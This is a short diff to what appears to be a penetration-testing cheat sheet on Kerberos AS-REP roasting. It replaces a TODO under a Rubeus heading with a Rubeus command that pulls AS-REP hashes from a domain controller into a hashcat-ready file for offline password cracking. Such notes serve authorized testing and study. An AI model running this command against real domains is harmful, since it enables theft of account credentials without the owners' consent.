@@ -31,7 +31,9 @@ GetNPUsers.py <domain>/<username> -dc-ip <ip>
 
 ### Rubeus
 
-TODO
+```cmd
+Rubeus.exe asreproast /user:<username> /dc:<ip> /domain:<domain> /outfile:hashes.txt /format:hashcat
+```
 
 ### kerbrute
 
